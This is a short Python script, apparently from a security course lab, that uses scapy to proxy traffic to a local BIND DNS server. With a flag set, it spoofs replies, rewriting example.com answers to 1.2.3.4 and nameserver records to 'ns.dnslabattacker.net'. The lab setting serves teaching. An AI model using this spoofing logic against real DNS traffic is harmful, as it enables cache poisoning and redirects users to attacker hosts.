#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("socket created")
s.bind(('', port))
print("socket bound")
dig_port = 0
while True:
	data = s.recvfrom(1024)
	if not data:
		break
	if data[1][1] == dns_port:
		print(data)
		dns_resp = DNS(data[0])
		if SPOOF:
			if dns_resp[DNS].qd[DNSQR].qname == 'example.com.':
				for x in range(dns_resp[DNS].ancount):
					dns_resp[DNSRR][x].rdata = '1.2.3.4'
				for x in range(dns_resp[DNS].nscount):
					dns_resp[DNS].ns[DNSRR][x].rdata = 'ns.dnslabattacker.net'
		s.sendto(bytes(dns_resp), ('127.0.0.1', dig_port))
	else:
		dig_port = data[1][1]
		s.sendto(data[0], ('127.0.0.1', dns_port))
